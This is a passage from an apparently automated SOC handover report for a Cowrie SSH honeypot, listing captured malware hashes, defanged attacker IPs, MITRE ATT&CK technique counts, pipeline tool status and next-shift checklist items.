| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `91.196.152[.]206` | FR | FR ONYPHE | **100** ⚠️ | 28 |
| `91.196.152[.]245` | FR | FR ONYPHE | **100** ⚠️ | 26 |
| `91.196.152[.]244` | FR | FR ONYPHE | **100** ⚠️ | 24 |
| `69.138.228[.]221` | US | Comcast Cable Communications, Inc | **100** ⚠️ | 6 |
| `177.102.83[.]35` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 2 |
| `8.148.200[.]68` | CN | Aliyun Computing Co.LTD | **59** | 1 |
| `64.236.200[.]83` | US | Microsoft Limited | **52** | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 73 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 44 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 28 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 14 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 14 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 78 cases |
| Tool 34  | Credential Extractor        | ✅ 72 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 8 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (3.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 6 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 28 priority case(s) shown individually · 5 recon entry/entries in table (2 group(s) consolidating 44 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-25T14:47:44Z_
